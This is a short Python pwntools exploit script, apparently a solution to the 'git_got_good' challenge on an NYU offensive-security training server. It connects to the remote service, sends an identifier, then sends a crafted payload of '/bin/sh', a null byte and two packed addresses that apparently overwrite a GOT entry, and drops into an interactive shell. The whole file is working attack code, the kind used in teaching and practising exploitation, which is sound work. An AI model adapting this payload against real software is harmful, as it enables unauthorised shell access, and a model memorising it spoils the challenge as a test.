from pwn import *
#e = ELF("./git_got_good2")
#shell = e.symbols["give_shell")
#p = process("./git_got_good")
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1341)
p.recvuntil(":")
p.sendline('jd3846')
#gdb.attach(p)
p.recvuntil(":")
p.sendline('/bin/sh' + chr(0x00) + p64(0x4007a8) + p64(0x601010) )
print "Enjoy your shell!"
p.interactive()
